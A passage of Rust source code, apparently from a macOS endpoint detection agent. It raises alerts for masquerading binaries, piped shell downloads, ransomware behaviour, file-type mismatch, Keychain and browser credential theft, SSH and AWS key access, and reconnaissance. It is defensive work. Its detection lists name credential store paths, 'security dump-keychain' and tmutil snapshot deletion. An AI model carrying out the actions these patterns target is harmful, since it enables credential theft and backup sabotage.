                || pattern == "open_executable_candidate"
                || pattern == "downloads_executable_reference"
        });

        if !installer_like {
            continue;
        }

        if is_benign_admin_tool_command(&process.command, &process.args)
            && !process.behavior.references_downloads_path
        {
            continue;
        }

        let high_signal = process.behavior.references_downloads_path
            || process.behavior.references_executable_candidate
            || process.behavior.has_shell_control_operator;

        if !high_signal {
            continue;
        }

        let severity = if process.behavior.references_downloads_path
            && process.behavior.references_executable_candidate
        {
            AlertSeverity::High
        } else {
            AlertSeverity::Medium
        };

        let mut details = json!({
            "pid": process.pid,
            "ppid": process.ppid,
            "command": process.command,
            "args": process.args,
            "process_kind": process.process_kind,
            "command_path_kind": process.command_path_kind,
            "matched_patterns": process.behavior.suspicious_command_patterns,
            "behavior": process.behavior,
            "parent_command": process.parent_command,
            "parent_args": process.parent_args,
            "parent_process_kind": process.parent_process_kind,
        });

        merge_chain_details(&mut details, chain_details(process.pid, ctx));

        detections.push(build_alert(
            ctx.now,
            "alert_downloaded_installer_activity",
            severity,
            "installer_execution",
            "A process referenced executable installer-like content from Downloads",
            details,
        ));
    }

    detections
}

fn should_suppress_command_pattern_detection(process: &ProcessInfo) -> bool {
    let benign_dev = is_benign_developer_tool_command(&process.command, &process.args);
    let benign_admin = is_benign_admin_tool_command(&process.command, &process.args);

    (benign_dev || benign_admin)
        && !process.behavior.references_downloads_path
        && !process.behavior.references_persistence_path
        && !process.behavior.references_url
        && !process
            .behavior
            .suspicious_command_patterns
            .iter()
            .any(|pattern| {
                pattern == "network_tool_piped_to_shell"
                    || pattern == "launchctl_persistence_operation"
                    || pattern == "crontab_persistence_operation"
            })
}

fn should_suppress_interpreter_detection(process: &ProcessInfo) -> bool {
    is_benign_developer_tool_command(&process.command, &process.args)
        && !process.behavior.references_downloads_path
        && !process.behavior.references_persistence_path
        && !process.behavior.references_url
}

fn should_suppress_persistence_tool_detection(process: &ProcessInfo) -> bool {
    is_benign_admin_tool_command(&process.command, &process.args)
        && !process.behavior.references_downloads_path
        && !process.behavior.references_persistence_path
        && !process.behavior.references_url
}

fn is_benign_process_context(process: &ProcessInfo) -> bool {
    should_suppress_command_pattern_detection(process) && should_suppress_interpreter_detection(process)
}

fn chain_details(pid: i32, ctx: &DetectionContext) -> Value {
    if let Some(chain) = ctx.execution_graph.chain_for_pid(pid, 6) {
        execution_chain_json(&chain, &ctx.lineage, pid)
    } else {
        json!({
            "chain_root_pid": pid,
            "chain_root_command": "unknown",
            "attack_chain_length": 1,
            "chain_pids": [pid],
            "chain_commands": [],
            "related_paths": [],
            "lineage_depth": ctx.lineage.lineage_depth_for_pid(pid, 6),
            "browser_ancestor_present": ctx.lineage.has_browser_ancestor(pid, 6),
            "nearest_browser_ancestor": ctx.lineage.nearest_browser_ancestor_command(pid, 6),
            "descendant_count": ctx.lineage.descendant_count_for_pid(pid, 6),
        })
    }
}

fn execution_chain_json(chain: &ExecutionChain, lineage: &LineageSnapshot, pid: i32) -> Value {
    json!({
        "chain_root_pid": chain.chain_root_pid,
        "chain_root_command": chain.chain_root_command,
        "attack_chain_length": chain.attack_chain_length,
        "chain_pids": chain.pids,
        "chain_commands": chain.process_chain.iter().map(|p| p.command.clone()).collect::<Vec<String>>(),
        "related_paths": chain.related_paths,
        "lineage_depth": lineage.lineage_depth_for_pid(pid, 6),
        "browser_ancestor_present": lineage.has_browser_ancestor(pid, 6),
        "nearest_browser_ancestor": lineage.nearest_browser_ancestor_command(pid, 6),
        "descendant_count": lineage.descendant_count_for_pid(pid, 6),
    })
}

fn merge_chain_details(details: &mut Value, chain: Value) {
    if let (Some(details_map), Some(chain_map)) = (details.as_object_mut(), chain.as_object()) {
        for (key, value) in chain_map {
            details_map.insert(key.clone(), value.clone());
        }
    }
}

fn quarantine_severity(event: &FileEventRecord) -> AlertSeverity {
    let ext = file_extension(&event.path);

    if event.is_executable || is_risky_download_extension(&ext) {
        AlertSeverity::High
    } else {
        AlertSeverity::Medium
    }
}

fn is_high_signal_download_path(path: &str) -> bool {
    if is_top_level_download_item(path) {
        return true;
    }

    let lower = path.to_ascii_lowercase();
    lower.ends_with(".app")
        || lower.ends_with(".pkg")
        || lower.ends_with(".dmg")
        || lower.ends_with(".zip")
        || lower.ends_with(".xip")
        || lower.ends_with(".sh")
        || lower.ends_with(".command")
        || lower.ends_with(".py")
        || lower.ends_with(".js")
        || lower.ends_with(".scpt")
}

fn is_top_level_download_item(path: &str) -> bool {
    let p = Path::new(path);
    let components: Vec<String> = p
        .components()
        .map(|c| c.as_os_str().to_string_lossy().to_string())
        .collect();

    if let Some(downloads_index) = components.iter().position(|c| c == "Downloads") {
        let remaining = components.len().saturating_sub(downloads_index + 1);
        return remaining == 1;
    }

    false
}

fn is_risky_download_extension(ext: &str) -> bool {
    matches!(
        ext,
        "app" | "pkg" | "dmg" | "zip" | "xip" | "sh" | "command" | "py" | "js" | "scpt" | "jar" | "bin"
    )
}

fn is_boring_shell_child(command: &str) -> bool {
    let filename = Path::new(command)
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or(command)
        .to_ascii_lowercase();

    matches!(filename.as_str(), "ps")
}

fn process_matches_download_path(
    process: &ProcessInfo,
    process_text: &str,
    download_path: &str,
) -> bool {
    if process_text.contains(download_path) || process.command == download_path {
        return true;
    }

    let basename = Path::new(download_path)
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or(download_path)
        .to_ascii_lowercase();

    let args_lower = process.args.to_ascii_lowercase();
    let command_lower = process.command.to_ascii_lowercase();

    args_lower.contains(&basename) || command_lower == basename
}

fn file_extension(path: &str) -> String {
    Path::new(path)
        .extension()
        .and_then(|ext| ext.to_str())
        .unwrap_or("")
        .to_ascii_lowercase()
}

fn build_alert(
    now: DateTime<Utc>,
    event_type: &str,
    severity: AlertSeverity,
    category: &str,
    reason: &str,
    details: serde_json::Value,
) -> TelemetryEvent {
    TelemetryEvent::new(
        now,
        event_type,
        "core-agent/detections",
        json!({
            "severity": severity.as_str(),
            "score": severity.score(),
            "category": category,
            "reason": reason,
            "details": details,
        }),
    )
}

fn parent_dir_string(path: &str) -> String {
    Path::new(path)
        .parent()
        .map(|p| p.to_string_lossy().to_string())
        .unwrap_or_else(|| "/".to_string())
}

// ─── Masquerading detection ───────────────────────────────────────────────────

/// System binary basenames that should only ever run from system paths.
/// MITRE: T1036 — Masquerading
const KNOWN_SYSTEM_BINARIES: &[&str] = &[
    "bash", "sh", "zsh", "dash", "ksh", "fish",
    "python", "python3", "perl", "ruby", "node",
    "osascript", "launchctl", "defaults", "xattr",
    "curl", "wget", "nc", "ncat", "openssl",
    "installer", "pkgutil", "softwareupdate", "security", "codesign",
    "chmod", "find", "grep", "awk", "sed", "ps", "kill",
];

/// Paths that qualify as a "system path" for masquerading checks.
fn is_system_path(path: &str) -> bool {
    let lower = path.to_ascii_lowercase();
    lower.starts_with("/usr/")
        || lower.starts_with("/bin/")
        || lower.starts_with("/sbin/")
        || lower.starts_with("/system/")
        || lower.starts_with("/private/var/db/")
        || lower.starts_with("/library/apple/")
}

/// Returns true when `path` has a dangerous executable extension preceded by a
/// benign-looking extension (e.g. "invoice.pdf.sh", "photo.jpg.app").
fn has_double_extension(path: &str) -> bool {
    let filename = Path::new(path)
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("");
    let lower = filename.to_ascii_lowercase();

    const DANGEROUS: &[&str] = &["sh", "app", "py", "js", "command", "bin", "dmg", "pkg", "scpt"];
    const DECOY: &[&str] = &[
        "pdf", "jpg", "jpeg", "png", "gif", "doc", "docx", "xlsx", "xls",
        "ppt", "pptx", "txt", "mp4", "mp3", "zip", "rar", "csv",
    ];

    // Confirm the final extension is dangerous
    let is_dangerous = DANGEROUS.iter().any(|ext| lower.ends_with(&format!(".{ext}")));
    if !is_dangerous {
        return false;
    }

    // Strip the dangerous extension and check if the remainder ends with a decoy extension
    if let Some(last_dot) = lower.rfind('.') {
        let stem_lower = &lower[..last_dot];
        DECOY.iter().any(|ext| stem_lower.ends_with(&format!(".{ext}")))
    } else {
        false
    }
}

fn detect_process_masquerading(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let mut detections = Vec::new();

    for process in &ctx.recent_processes {
        let command = &process.command;

        // Only flag when we have a full path (starts with '/')
        if !command.starts_with('/') {
            continue;
        }

        let basename_str = Path::new(command)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("")
            .to_ascii_lowercase();

        if basename_str.is_empty() {
            continue;
        }

        let is_known_system_binary = KNOWN_SYSTEM_BINARIES.contains(&basename_str.as_str());
        if !is_known_system_binary {
            continue;
        }

        if is_system_path(command) {
            continue;
        }

        // Known system binary running from a non-system path — masquerading
        let severity = if command.contains("/Downloads/") || command.contains("/Desktop/") {
            AlertSeverity::Critical
        } else {
            AlertSeverity::High
        };

        let mut details = json!({
            "pid": process.pid,
            "ppid": process.ppid,
            "command": command,
            "args": process.args,
            "binary_name": basename_str,
            "binary_path": command,
            "process_kind": process.process_kind,
            "command_path_kind": process.command_path_kind,
            "parent_command": process.parent_command,
            "parent_process_kind": process.parent_process_kind,
            "mitre_technique": "T1036",
            "reason": format!(
                "'{}' is a known system binary name but is executing from '{}', not a system path",
                basename_str, command
            ),
        });

        merge_chain_details(&mut details, chain_details(process.pid, ctx));

        detections.push(build_alert(
            ctx.now,
            "alert_process_masquerading",
            severity,
            "masquerading",
            "A process binary name matches a known system tool but is running from a non-system path",
            details,
        ));
    }

    detections
}

// ─── Command Pattern / LOLBin detection ──────────────────────────────────────

/// Run the structured command pattern rule engine against every recently-seen
/// process and emit per-rule-class alerts.
///
/// Produces three distinct alert types depending on the matched rule's alert_type:
///   alert_curl_pipe_bash           — CPR-001, 002, 003
///   alert_command_injection_pattern — CPR-004..008, 014
///   alert_lolbin_execution          — CPR-009..013
fn detect_lolbin_and_injection(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let mut detections = Vec::new();

    for process in &ctx.recent_processes {
        if should_suppress_command_pattern_detection(process) {
            continue;
        }

        let matched: Vec<&command_patterns::CommandPatternRule> =
            command_patterns::match_rules(process);
        if matched.is_empty() {
            continue;
        }

        // Group matches by alert_type and emit one alert per type per process
        let mut by_alert_type: HashMap<&str, Vec<&command_patterns::CommandPatternRule>> =
            HashMap::new();
        for rule in &matched {
            by_alert_type.entry(rule.alert_type).or_default().push(rule);
        }

        for (alert_type, rules) in by_alert_type {
            // Severity is the highest across all matching rules of this type
            let severity = rules.iter().fold(AlertSeverity::Low, |acc, rule| {
                if rule.severity.score() > acc.score() {
                    rule.severity
                } else {
                    acc
                }
            });

            let mitre_techniques: Vec<&str> = {
                let mut v: Vec<&str> = rules
                    .iter()
                    .map(|r| r.mitre_technique_id)
                    .collect();
                v.sort_unstable();
                v.dedup();
                v
            };

            let matched_rule_ids: Vec<&str> = rules.iter().map(|r| r.id).collect();
            let matched_rule_names: Vec<&str> = rules.iter().map(|r| r.name).collect();
            let confidence = rules
                .iter()
                .find(|r| r.confidence == "high")
                .map(|_| "high")
                .unwrap_or_else(|| {
                    rules
                        .iter()
                        .find(|r| r.confidence == "medium")
                        .map(|_| "medium")
                        .unwrap_or("low")
                });

            let reason = rules
                .iter()
                .map(|r| r.description)
                .collect::<Vec<_>>()
                .join("; ");

            let mut details = json!({
                "pid": process.pid,
                "ppid": process.ppid,
                "command": process.command,
                "args": process.args,
                "process_kind": process.process_kind,
                "command_path_kind": process.command_path_kind,
                "matched_rule_ids": matched_rule_ids,
                "matched_rule_names": matched_rule_names,
                "mitre_techniques": mitre_techniques,
                "confidence": confidence,
                "behavior": process.behavior,
                "parent_command": process.parent_command,
                "parent_process_kind": process.parent_process_kind,
            });

            merge_chain_details(&mut details, chain_details(process.pid, ctx));

            detections.push(build_alert(
                ctx.now,
                alert_type,
                severity,
                "command_pattern",
                &reason,
                details,
            ));
        }
    }

    detections
}

// ─── Ransomware behavioral heuristics ────────────────────────────────────────
//
// Detects ransomware-characteristic activity patterns.
// MITRE T1486 — Data Encrypted for Impact
//
// Sub-signals that compose alert_ransomware_behavior_detected:
//   ransomware_extension_wave  — many files renamed to known ransom extensions
//   ransom_note_created        — ransom note file created in user directories
//   backup_tampering           — tmutil disable/deletelocalsnapshots detected
//   mass_file_modification     — high-rate file_modified events across unique files

/// Minimum number of files with ransomware-like extensions in the window.
const RANSOMWARE_EXTENSION_WAVE_THRESHOLD: usize = 8;
/// Minimum number of distinct file_modified events to trigger mass modification signal.
const MASS_MODIFICATION_THRESHOLD: usize = 15;
/// Observation window in seconds for extension wave and mass modification.
const RANSOMWARE_WINDOW_SECONDS: i64 = 30;

const RANSOMWARE_EXTENSIONS: &[&str] = &[
    ".locked", ".encrypted", ".enc", ".crypt", ".crypted",
    ".zepto", ".cerber", ".locky", ".wannacry", ".wcry",
    ".wnry", ".wncry", ".ransom", ".pays", ".payb",
    ".corona", ".deadfiles", ".neeiv", ".lkdtt", ".bitx",
];

const RANSOM_NOTE_NAMES: &[&str] = &[
    "readme.txt", "readme.html", "how_to_decrypt.txt", "how_to_decrypt.html",
    "decrypt_instructions.txt", "decrypt_files.txt", "restore_files.txt",
    "your_files_are_encrypted.txt", "help_decrypt.html", "recover_files.txt",
    "ransom_note.txt", "!!readme!!", "!decrypt!", "#decrypt#",
    "files_encrypted.txt", "how_to_recover.txt",
];

/// Detect ransomware-characteristic behavioral patterns in file and process events.
fn detect_ransomware_behavior(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let cutoff = ctx.now - Duration::seconds(RANSOMWARE_WINDOW_SECONDS);
    let mut detections = Vec::new();

    let recent: Vec<&FileEventRecord> = ctx
        .recent_file_events
        .iter()
        .filter(|e| e.timestamp >= cutoff)
        .collect();

    // ── Sub-signal 1: Extension wave ──────────────────────────────────────────
    // Count files whose path ends with a known ransomware extension.
    let extension_wave_count = recent
        .iter()
        .filter(|e| {
            let path_lower = e.path.to_ascii_lowercase();
            RANSOMWARE_EXTENSIONS.iter().any(|ext| path_lower.ends_with(ext))
        })
        .count();

    if extension_wave_count >= RANSOMWARE_EXTENSION_WAVE_THRESHOLD {
        detections.push(build_alert(
            ctx.now,
            "alert_ransomware_behavior_detected",
            AlertSeverity::Critical,
            "impact",
            "Ransomware extension wave: multiple files renamed to known ransomware extensions",
            json!({
                "sub_signal": "ransomware_extension_wave",
                "mitre_technique": "T1486",
                "confidence": "high",
                "files_with_ransomware_extension": extension_wave_count,
                "window_seconds": RANSOMWARE_WINDOW_SECONDS,
                "threshold": RANSOMWARE_EXTENSION_WAVE_THRESHOLD,
            }),
        ));
    }

    // ── Sub-signal 2: Ransom note creation ────────────────────────────────────
    for event in &recent {
        if !matches!(event.kind.as_str(), "file_created" | "file_modified") {
            continue;
        }
        let filename = Path::new(&event.path)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("")
            .to_ascii_lowercase();
        if RANSOM_NOTE_NAMES.iter().any(|note| filename.starts_with(*note) || filename == *note) {
            let parent = parent_dir_string(&event.path).to_ascii_lowercase();
            // Only flag notes dropped in user-accessible directories (not tmp or system dirs)
            let in_user_dir = parent.contains("/downloads")
                || parent.contains("/desktop")
                || parent.contains("/documents")
                || parent.contains("/home")
                || parent.contains(&std::env::var("HOME").unwrap_or_default().to_ascii_lowercase());
            if in_user_dir {
                detections.push(build_alert(
                    ctx.now,
                    "alert_ransomware_behavior_detected",
                    AlertSeverity::Critical,
                    "impact",
                    "Ransom note file created in user directory",
                    json!({
                        "sub_signal": "ransom_note_created",
                        "mitre_technique": "T1486",
                        "confidence": "high",
                        "path": event.path,
                        "filename": filename,
                    }),
                ));
                break; // one alert per detection pass is sufficient
            }
        }
    }

    // ── Sub-signal 3: Backup tampering via tmutil ─────────────────────────────
    for process in &ctx.recent_processes {
        let cmd_basename = Path::new(&process.command)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("")
            .to_ascii_lowercase();

        if cmd_basename != "tmutil" {
            continue;
        }

        let args_lower = process.args.to_ascii_lowercase();
        let is_destructive = args_lower.starts_with("disable")
            || args_lower.starts_with("deletelocalsnapshots")
            || args_lower.starts_with("deletesnapshot")
            || args_lower.contains(" disable")
            || args_lower.contains(" deletelocalsnapshots")
            || args_lower.contains(" deletesnapshot");

        if !is_destructive {
            continue;
        }

        let mut details = json!({
            "sub_signal": "backup_tampering",
            "mitre_technique": "T1490",
            "confidence": "high",
            "pid": process.pid,
            "ppid": process.ppid,
            "command": process.command,
            "args": process.args,
            "process_kind": process.process_kind,
        });
        merge_chain_details(&mut details, chain_details(process.pid, ctx));

        detections.push(build_alert(
            ctx.now,
            "alert_ransomware_behavior_detected",
            AlertSeverity::High,
            "impact",
            "tmutil used to disable or delete backups — ransomware backup sabotage pattern",
            details,
        ));
    }

    // ── Sub-signal 4: Mass file modification ─────────────────────────────────
    // Count unique paths with file_modified in the window. High rates of unique
    // file modifications (not the same file being written repeatedly) are a
    // strong ransomware encryption indicator.
    let mut modified_paths: std::collections::HashSet<&str> = std::collections::HashSet::new();
    for event in &recent {
        if event.kind == "file_modified" {
            modified_paths.insert(&event.path);
        }
    }

    if modified_paths.len() >= MASS_MODIFICATION_THRESHOLD {
        detections.push(build_alert(
            ctx.now,
            "alert_ransomware_behavior_detected",
            AlertSeverity::High,
            "impact",
            "Mass file modification: high rate of unique file writes consistent with encryption",
            json!({
                "sub_signal": "mass_file_modification",
                "mitre_technique": "T1486",
                "confidence": "medium",
                "unique_files_modified": modified_paths.len(),
                "window_seconds": RANSOMWARE_WINDOW_SECONDS,
                "threshold": MASS_MODIFICATION_THRESHOLD,
            }),
        ));
    }

    detections
}

// ─── File type mismatch (magic bytes vs extension) ────────────────────────────
//
// Detects files whose declared extension does not match their actual content.
// MITRE T1036.007 — Masquerading: Double File Extension
// MITRE T1027     — Obfuscated Files or Information (binary disguised as document)

/// Extension → expected content families. If we see a different magic_bytes_hint
/// than what's listed here, it's suspicious.
struct ExtensionRule {
    extension: &'static str,
    /// Set of magic_bytes_hint values that are acceptable for this extension.
    /// An executable hint (elf/macho*) with a document extension is always flagged.
    benign_magic_hints: &'static [&'static str],
}

const EXTENSION_RULES: &[ExtensionRule] = &[
    ExtensionRule { extension: "pdf",  benign_magic_hints: &["pdf"] },
    ExtensionRule { extension: "jpg",  benign_magic_hints: &["jpeg"] },
    ExtensionRule { extension: "jpeg", benign_magic_hints: &["jpeg"] },
    ExtensionRule { extension: "png",  benign_magic_hints: &["png"] },
    ExtensionRule { extension: "zip",  benign_magic_hints: &["zip"] },
    ExtensionRule { extension: "docx", benign_magic_hints: &["zip"] }, // OOXML is zip
    ExtensionRule { extension: "xlsx", benign_magic_hints: &["zip"] },
    ExtensionRule { extension: "pptx", benign_magic_hints: &["zip"] },
    ExtensionRule { extension: "jar",  benign_magic_hints: &["zip"] },
    ExtensionRule { extension: "txt",  benign_magic_hints: &[] }, // any executable bytes are suspicious
    ExtensionRule { extension: "csv",  benign_magic_hints: &[] },
    ExtensionRule { extension: "md",   benign_magic_hints: &[] },
];

/// The magic hints that indicate executable/binary content.
const EXECUTABLE_MAGIC_HINTS: &[&str] = &["elf", "macho64", "macho32", "macho_fat"];

fn detect_file_type_mismatch(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let cutoff = ctx.now - Duration::seconds(300);
    let mut detections = Vec::new();

    for event in &ctx.recent_file_events {
        if event.timestamp < cutoff {
            continue;
        }
        if !matches!(event.kind.as_str(), "file_created" | "file_modified") {
            continue;
        }

        let magic = match &event.magic_bytes_hint {
            Some(m) => m.as_str(),
            None => continue,
        };

        let path_lower = event.path.to_ascii_lowercase();
        let ext = Path::new(&path_lower)
            .extension()
            .and_then(|e| e.to_str())
            .unwrap_or("");

        // Find matching rule for this extension
        let rule = EXTENSION_RULES.iter().find(|r| r.extension == ext);

        let is_mismatch = match rule {
            Some(r) => {
                // Any executable magic with a document extension is always flagged
                if EXECUTABLE_MAGIC_HINTS.contains(&magic) {
                    true
                } else if r.benign_magic_hints.is_empty() {
                    // Extensions like .txt and .csv should never have executable signatures —
                    // any known magic is suspicious
                    EXECUTABLE_MAGIC_HINTS.contains(&magic)
                } else {
                    // Flag if the magic hint is not in the benign set
                    !r.benign_magic_hints.contains(&magic)
                }
            }
            None => {
                // No rule for this extension — flag only if content looks executable
                EXECUTABLE_MAGIC_HINTS.contains(&magic)
            }
        };

        if !is_mismatch {
            continue;
        }

        detections.push(build_alert(
            ctx.now,
            "alert_file_type_mismatch",
            AlertSeverity::High,
            "defense_evasion",
            &format!("File extension .{ext} does not match actual content type ({magic})"),
            json!({
                "path": event.path,
                "declared_extension": ext,
                "actual_magic_hint": magic,
                "mitre_technique": "T1036",
                "confidence": "high",
            }),
        ));
    }

    detections
}

// ─── Credential access detection ─────────────────────────────────────────────
//
// Covers:
//   T1555.001 — Keychain access via `security` CLI
//   T1555.003 — Browser credential store access
//   T1552.004 — SSH private key access
//   T1552.001 — AWS/plaintext credential file access

/// Detect the `security` CLI being used to dump credentials from the Keychain.
/// Legitimate users rarely invoke `security find-generic-password` or
/// `security dump-keychain` from the command line. Attackers use this to
/// harvest saved passwords without requiring root.
///
/// MITRE T1555.001 — Credentials from Password Stores: Keychain
fn detect_keychain_access_attempt(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    const KEYCHAIN_SUBCOMMANDS: &[&str] = &[
        "find-generic-password",
        "find-internet-password",
        "dump-keychain",
        "find-certificate",
        "export",
    ];

    let mut alerts = Vec::new();

    for process in &ctx.recent_processes {
        let cmd_basename = Path::new(&process.command)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("")
            .to_ascii_lowercase();

        if cmd_basename != "security" {
            continue;
        }

        let args_lower = process.args.to_ascii_lowercase();
        let matched_subcommand = KEYCHAIN_SUBCOMMANDS
            .iter()
            .find(|&&sub| args_lower.starts_with(sub) || args_lower.contains(&format!(" {sub}")));

        let Some(&subcommand) = matched_subcommand else {
            continue;
        };

        // Suppress when called by system processes on system paths — some Apple
        // frameworks legitimately query the Keychain via the security CLI.
        if process.process_kind == "system" {
            continue;
        }

        let severity = if subcommand == "dump-keychain" {
            AlertSeverity::Critical
        } else {
            AlertSeverity::High
        };

        let mut details = json!({
            "pid": process.pid,
            "ppid": process.ppid,
            "command": process.command,
            "args": process.args,
            "process_kind": process.process_kind,
            "subcommand": subcommand,
            "mitre_technique": "T1555.001",
            "confidence": "high",
        });
        merge_chain_details(&mut details, chain_details(process.pid, ctx));

        alerts.push(build_alert(
            ctx.now,
            "alert_keychain_access_attempt",
            severity,
            "credential_access",
            &format!("security {subcommand} — Keychain credential extraction attempt"),
            details,
        ));
    }

    alerts
}

/// Detect non-system processes reading browser credential databases or cookie
/// stores. This covers Chrome and Firefox login data, which are prime targets
/// for infostealer malware.
///
/// MITRE T1555.003 — Credentials from Web Browsers
fn detect_browser_credential_access(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let home = std::env::var("HOME").unwrap_or_default();

    // Paths that contain browser-stored credentials
    let credential_paths: &[&str] = &[
        "Library/Application Support/Google/Chrome/Default/Login Data",
        "Library/Application Support/Google/Chrome/Default/Cookies",
        "Library/Application Support/BraveSoftware/Brave-Browser/Default/Login Data",
        "Library/Application Support/Microsoft Edge/Default/Login Data",
        "Library/Application Support/Firefox/Profiles",
        "Library/Cookies/Cookies.binarycookies",
        "Library/Safari/Cookies.binarycookies",
        "Library/Application Support/com.apple.Safari/SafariTabs.db",
    ];

    let mut alerts = Vec::new();

    for process in &ctx.recent_processes {
        // Browsers themselves accessing their own credential stores is normal
        if process.process_kind == "browser" || process.process_kind == "system" {
            continue;
        }

        let args_lower = process.args.to_ascii_lowercase();
        let full_lower = format!("{} {}", process.command, process.args).to_ascii_lowercase();

        let matched_path = credential_paths.iter().find(|&&cred_path| {
            let absolute = format!("{home}/{cred_path}").to_ascii_lowercase();
            let relative = cred_path.to_ascii_lowercase();
            full_lower.contains(&absolute) || full_lower.contains(&relative) || args_lower.contains(&relative)
        });

        let Some(&cred_path) = matched_path else {
            continue;
        };

        let mut details = json!({
            "pid": process.pid,
            "ppid": process.ppid,
            "command": process.command,
            "args": process.args,
            "process_kind": process.process_kind,
            "accessed_credential_path": cred_path,
            "mitre_technique": "T1555.003",
            "confidence": "high",
        });
        merge_chain_details(&mut details, chain_details(process.pid, ctx));

        alerts.push(build_alert(
            ctx.now,
            "alert_browser_credential_access",
            AlertSeverity::High,
            "credential_access",
            &format!("Non-browser process accessing browser credential store: {cred_path}"),
            details,
        ));
    }

    alerts
}

/// Detect processes accessing SSH private keys or cloud credential files.
/// Covers ~/.ssh/id_*, ~/.aws/credentials, and ~/.aws/config.
///
/// MITRE T1552.004 — Unsecured Credentials: Private Keys (SSH)
/// MITRE T1552.001 — Unsecured Credentials: Credentials in Files (AWS)
fn detect_credential_file_access(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let home = std::env::var("HOME").unwrap_or_default();

    struct CredentialTarget {
        path_fragment: &'static str,
        alert_type: &'static str,
        mitre_technique: &'static str,
        label: &'static str,
    }

    let targets: &[CredentialTarget] = &[
        CredentialTarget {
            path_fragment: ".ssh/id_rsa",
            alert_type: "alert_ssh_key_access",
            mitre_technique: "T1552.004",
            label: "SSH RSA private key",
        },
        CredentialTarget {
            path_fragment: ".ssh/id_ed25519",
            alert_type: "alert_ssh_key_access",
            mitre_technique: "T1552.004",
            label: "SSH Ed25519 private key",
        },
        CredentialTarget {
            path_fragment: ".ssh/id_ecdsa",
            alert_type: "alert_ssh_key_access",
            mitre_technique: "T1552.004",
            label: "SSH ECDSA private key",
        },
        CredentialTarget {
            path_fragment: ".aws/credentials",
            alert_type: "alert_ssh_key_access",
            mitre_technique: "T1552.001",
            label: "AWS credentials file",
        },
        CredentialTarget {
            path_fragment: ".aws/config",
            alert_type: "alert_ssh_key_access",
            mitre_technique: "T1552.001",
            label: "AWS config file",
        },
    ];

    let mut alerts = Vec::new();

    for process in &ctx.recent_processes {
        // System processes legitimately read SSH keys (ssh-agent, sshd)
        if process.process_kind == "system" {
            continue;
        }

        // The ssh/scp/sftp clients themselves reading their own keys is normal
        let cmd_basename = Path::new(&process.command)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("")
            .to_ascii_lowercase();
        if matches!(cmd_basename.as_str(), "ssh" | "scp" | "sftp" | "ssh-add" | "ssh-agent" | "git") {
            continue;
        }

        let full_lower = format!("{} {}", process.command, process.args).to_ascii_lowercase();

        for target in targets {
            let absolute = format!("{home}/{}", target.path_fragment).to_ascii_lowercase();
            let relative = target.path_fragment.to_ascii_lowercase();

            if !full_lower.contains(&absolute) && !full_lower.contains(&relative) {
                continue;
            }

            let mut details = json!({
                "pid": process.pid,
                "ppid": process.ppid,
                "command": process.command,
                "args": process.args,
                "process_kind": process.process_kind,
                "accessed_path": target.path_fragment,
                "mitre_technique": target.mitre_technique,
                "confidence": "high",
                "label": target.label,
            });
            merge_chain_details(&mut details, chain_details(process.pid, ctx));

            alerts.push(build_alert(
                ctx.now,
                target.alert_type,
                AlertSeverity::High,
                "credential_access",
                &format!("Unexpected process accessing {}: {}", target.label, process.command),
                details,
            ));
            break; // one alert per process per detection pass
        }
    }

    alerts
}

// ─── Discovery / Reconnaissance detection ────────────────────────────────────
//
// Detects attacker reconnaissance that typically precedes lateral movement or
// exfiltration. Covered MITRE techniques:
//   T1082 — System Information Discovery
//   T1016 — System Network Configuration Discovery
//   T1083 — File and Directory Discovery

const SYSTEM_RECON_COMMANDS: &[&str] = &[
    "system_profiler",
    "sw_vers",
    "uname",
    "hostname",
    "hostinfo",
    "sysctl",
    "ioreg",
];

const NETWORK_RECON_COMMANDS: &[&str] = &[
    "ifconfig",
    "networksetup",
    "netstat",
    "arp",
    "route",
    "ipconfig",
    "scutil",
];

/// Detect system information discovery by non-system processes.
/// MITRE T1082
fn detect_system_recon(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let mut alerts = Vec::new();

    for process in &ctx.recent_processes {
        // System processes legitimately query system info
        if process.process_kind == "system" {
            continue;
        }

        let cmd_basename = Path::new(&process.command)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("")
            .to_ascii_lowercase();

        let matched = SYSTEM_RECON_COMMANDS
            .iter()
            .find(|&&cmd| cmd_basename == cmd || cmd_basename.starts_with(cmd));

        let Some(&recon_cmd) = matched else {
            continue;
        };

        // Suppress common legitimate developer/admin uses of uname in build scripts
        if recon_cmd == "uname" && is_benign_developer_tool_command(&process.command, &process.args) {
            continue;
        }

        let mut details = json!({
            "pid": process.pid,
            "ppid": process.ppid,
            "command": process.command,
            "args": process.args,
            "process_kind": process.process_kind,
            "recon_tool": recon_cmd,
            "mitre_technique": "T1082",
            "confidence": "medium",
        });
        merge_chain_details(&mut details, chain_details(process.pid, ctx));

        alerts.push(build_alert(
            ctx.now,
            "alert_system_recon_detected",
            AlertSeverity::Medium,
            "discovery",
            &format!("{recon_cmd} — system information discovery by non-system process"),
            details,
        ));
    }

    alerts
}

/// Detect network configuration discovery by interpreter or user_app processes.
/// MITRE T1016
fn detect_network_recon(ctx: &DetectionContext) -> Vec<TelemetryEvent> {
    let mut alerts = Vec::new();

    for process in &ctx.recent_processes {
        if process.process_kind == "system" {
            continue;
        }

        // Network recon is only suspicious when called by interpreters or user_app.
        // Browsers and system processes have legitimate reasons for network queries.
        if !matches!(
            process.process_kind.as_str(),
            "interpreter" | "user_app" | "unknown"
        ) {
            continue;
        }

        let cmd_basename = Path::new(&process.command)
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("")
            .to_ascii_lowercase();

        let matched = NETWORK_RECON_COMMANDS
            .iter()
            .find(|&&cmd| cmd_basename == cmd);

        let Some(&recon_cmd) = matched else {
            continue;
        };

        let mut details = json!({
            "pid": process.pid,
            "ppid": process.ppid,
